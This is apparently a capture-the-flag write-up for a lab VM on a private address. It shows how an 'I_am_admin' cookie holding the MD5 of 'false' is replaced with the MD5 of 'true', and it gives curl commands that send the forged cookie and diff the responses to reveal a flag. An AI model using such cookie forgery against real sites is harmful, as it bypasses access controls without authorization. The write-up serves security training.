# Cookies

__http://192.168.56.101__

## Description
The command can send to url cookies.

## Form Outputs
Inspect page source in network:
```Set-Cookie: I_am_admin=68934a3e9455fa72420237eb05902327```




## Flag
Let's convert [I_am_admit](#https://md5.gromweb.com/?md5=68934a3e9455fa72420237eb05902327) from md5. We get __false__. </br>
So what about __true__ -> 'b326b5062b2f0e69046810717534cb09'
When we compare the outputs with cookies true and false weget the next flag.
```
curl -s 'http://192.168.56.101' -o false.html
curl -s --cookie I_am_admin=b326b5062b2f0e69046810717534cb09 'http://192.168.56.101' -o true.html 
diff false.html true.html 
```

## Safety
We should learn about cookies and how they can be used to track user activity on a website. </br>
Specifically, you should learn how to use the curl command to send cookies to a URL and how to compare the output of two requests with different cookie values to determine if a flag is present. </br>
Additionally, you should be aware of the potential risks associated with cookies, such as the possibility of them being stolen or used for malicious purposes.